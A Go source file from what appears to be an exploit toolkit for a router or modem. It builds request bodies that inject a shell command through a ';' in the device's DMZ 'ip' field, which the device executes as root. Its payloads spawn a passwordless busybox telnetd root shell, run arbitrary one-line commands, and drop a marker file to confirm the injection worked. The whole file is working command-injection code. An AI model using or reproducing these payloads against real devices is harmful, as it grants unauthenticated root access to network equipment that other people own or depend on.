package zlt

import (
	"fmt"
	"regexp"
	"strings"
)

// ShellModes are the root-shell payloads this toolkit knows how to install.
const (
	// ShellModeTelnet spawns a passwordless busybox telnetd on tcp/23.
	// This is the exact payload recovered from the device's own saved request.
	ShellModeTelnet = "telnet"

	// ShellModeTelnetAlt spawns telnetd on an alternate port (useful when 23
	// is already occupied or filtered).
	ShellModeTelnetAlt = "telnet-alt"

	// ShellModeCallback submits an arbitrary command (see CommandPayload).
	ShellModeCallback = "command"
)

// safeHost guards against building a payload from hostile input. The whole
// point of this package is to place a shell metacharacter into a field that the
// device executes, so the blast radius has to be bounded deliberately.
var safeHost = regexp.MustCompile(`^[0-9]{1,3}(\.[0-9]{1,3}){3}$`)

// DMZPayload builds the JSON body for cmd=172 subcmd=6 (network service / DMZ).
//
// The device's DMZ "ip" field is interpolated into a shell command executed as
// root; a ';' therefore starts an additional command. dmzHost must be a bare
// IPv4 address — it is the value a legitimate administrator would type.
func DMZPayload(sessionID, dmzHost, injectedCommand string) (map[string]any, error) {
	if !safeHost.MatchString(dmzHost) {
		return nil, fmt.Errorf("zlt: dmzHost %q must be a bare IPv4 address", dmzHost)
	}
	if strings.TrimSpace(injectedCommand) == "" {
		return nil, fmt.Errorf("zlt: injectedCommand must not be empty")
	}
	if strings.ContainsAny(injectedCommand, "\n\r") {
		return nil, fmt.Errorf("zlt: injectedCommand must be a single line")
	}
	return map[string]any{
		"cmd":       CmdNetworkService,
		"method":    "POST",
		"subcmd":    DefaultDMZSubCmd,
		"sessionId": sessionID,
		"enabled":   "1",
		"ip":        dmzHost + ";" + injectedCommand,
	}, nil
}

// TelnetCommand is the payload that starts a passwordless root shell.
//
// "-l /bin/sh" replaces the login program with a shell, so the daemon skips
// authentication entirely. This is byte-for-byte what shipped on the reference
// device.
func TelnetCommand(port int) string {
	if port <= 0 || port > 65535 {
		port = 23
	}
	return fmt.Sprintf(telnetTmpl, port)
}

// CommandPayload builds a DMZ body for an arbitrary one-line command.
func CommandPayload(sessionID, dmzHost, command string) (map[string]any, error) {
	return DMZPayload(sessionID, dmzHost, command)
}

// VerifyCommand returns a command whose effect is observable without a shell:
// it writes a marker file that a subsequent session can read back.
func VerifyCommand(marker string) string {
	return fmt.Sprintf("echo %s > /tmp/.zlt_unlock_marker", marker)
}
